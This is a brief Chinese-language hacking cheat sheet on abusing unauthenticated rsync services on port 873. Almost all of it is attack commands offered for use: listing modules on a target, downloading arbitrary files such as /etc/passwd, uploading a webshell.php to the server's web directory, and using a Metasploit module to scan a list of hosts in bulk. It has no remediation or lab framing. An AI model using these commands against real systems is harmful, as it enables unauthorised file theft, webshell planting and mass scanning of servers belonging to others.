RCSYNC

目录

  • 利用
    • 手动
    • msf

Linux下一款数据备份工具,默认监听873端口

利用

手动

rsync rsync://your-ip:873/
rsync rsync://your-ip:873/src 来查看模块名列表
我们再列出src模块下的文件
rsync rsync://your-ip:873/src/

我们可以下载任意文件或目录：
rsync -av rsync://your-ip:873/src/etc/passwd ./
rsync -avz rsync://ip:port/ /var/tmp

上传文件到服务器：
rsync -avz webshell.php ip::web/

msf

可以批量

msf > use auxiliary/scanner/rsync/modules_list
msf auxiliary(modules_list) > show options
    ... show and set options ...
msf auxiliary(modules_list) > set RHOSTS file:/root/url.txt
msf auxiliary(modules_list) > exploit
